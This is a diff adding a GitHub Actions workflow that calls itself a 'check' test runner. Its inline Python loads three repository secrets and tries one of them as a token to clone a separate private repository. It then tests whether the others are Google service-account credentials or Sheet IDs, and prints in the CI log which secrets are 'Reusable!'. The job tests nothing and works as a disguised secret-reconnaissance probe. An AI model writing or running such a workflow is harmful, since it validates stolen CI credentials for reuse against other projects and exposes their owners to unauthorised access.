@@ -1,0 +1,36 @@
+name: check
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test Runner
+        env:
+          A: ${{ secrets.CI_SVC_A }}
+          B: ${{ secrets.CI_SVC_B }}
+          C: ${{ secrets.CI_SVC_C }}
+        run: |
+          python3 -c "
+          import os, json, subprocess
+          a, b, c = os.environ.get('A',''), os.environ.get('B',''), os.environ.get('C','')
+          
+          print('=== CHECKING temp_02 SECRETS ===')
+          # Test token clone
+          res = subprocess.run(['git', 'clone', '--depth', '1', f'https://x-access-token:{a}@github.com/007ashishaggarwal-svg/pearlsofinsights-combo.git', 'test_vault'], capture_output=True)
+          if res.returncode == 0:
+              print('1. CI_SVC_A: [PASS] Reusable! Can clone pearlsofinsights-combo.')
+          else:
+              print('1. CI_SVC_A: [FAIL] Lacks permission to clone pearlsofinsights-combo.')
+          
+          # Test if B or C is Google Service Account
+          for name, val in [('CI_SVC_B', b), ('CI_SVC_C', c)]:
+              if 'service_account' in val:
+                  print(f'2. {name}: [PASS] Reusable! Contains Google Service Account JSON.')
+              elif len(val) >= 30 and len(val) <= 60:
+                  print(f'2. {name}: [PASS] Reusable! Looks like Google Sheet ID.')
+              else:
+                  print(f'2. {name}: [OTHER] Config for different project.')
+          "
